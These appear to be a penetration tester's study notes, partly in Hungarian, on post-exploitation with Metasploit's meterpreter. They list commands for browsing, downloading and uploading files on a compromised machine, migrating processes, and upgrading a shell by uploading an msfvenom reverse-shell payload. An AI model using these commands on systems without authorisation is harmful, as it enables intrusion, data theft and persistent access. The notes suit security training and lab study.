# post exploitation
## post exploitation techniques
* local enumeration
* privilege escalation
* dumping hashes
* establishing persistence
* clearing your tracks
* pivoting
## meterpreter
### running local commands on the attack machine (outside of metasploit)
* put an extra 'l' before the command
* meterpreter> lls (-> local ls)
* meterpreter> lcd (-> local cd)
* meterpreter> lpwd (-> local pwd)
### running remote commands on the victim machine
* meterpreter> help
* meterpreter> sysinfo
* meterpreter> getuid
* meterpreter> background
* meterpreter> sessions
* meterpreter> sessions -C sysinfo -i 1 (runs sysinfo command on session 1)
* meterpreter> ls
* meterpreter> pwd
* meterpreter> cd
* meterpreter> cat
* meterpreter> edit (edit with vim)
* meterpreter> shell (and after it do meterpreter> /bin/bash -i)
* meterpreter> download
* meterpreter> upload
* meterpreter> checksum md5 ~/file1.txt
* meterpreter> getenv PATH (print environment variables)
* searching files (default search in entire system)
  * meterpreter> search -f *backdoor* (search for files with name containing backdoor)
  * * meterpreter> search -f *.php (search for php files)
  * meterpreter> search -d /usr -f *.php (search only in /usr and subdirectories)
* meterpreter> ps
* meterpreter> migrate 580 (migrate to pid 580)
  * elofordulhat hogy nem sikerul linux alatt a migrate !!!!
  * ilyenkor keressunk masikat
* meterpreter> migrate -N apache2 (migrate by name)
* meterpreter> execute -f ifconfig (execute a command)
## upgrading simple shell to meterpreter shell
### info
* van hogy nem adja be a meterpreter shell-t, de ettol fuggetlenul a hatterben mar megnyitotta
* es ha kilistazzuk a sessions-t akkor ott lesz es at lehet ra valtani "session -i n"-el
### methods
1. meterpreter> sessions -u 1 (-u kapcsoloval automatikusan meghivja a shell_to_meterpreter modult-t es atkonvertalja a shell-t)
2. msf6> use post/multi/manage/shell_to_meterpreter
3. msfvenom meterpreter_reverse_shell  
-> upload and run msfvenom meterpreter_reverse_shell to the target and get connection with multi/handler
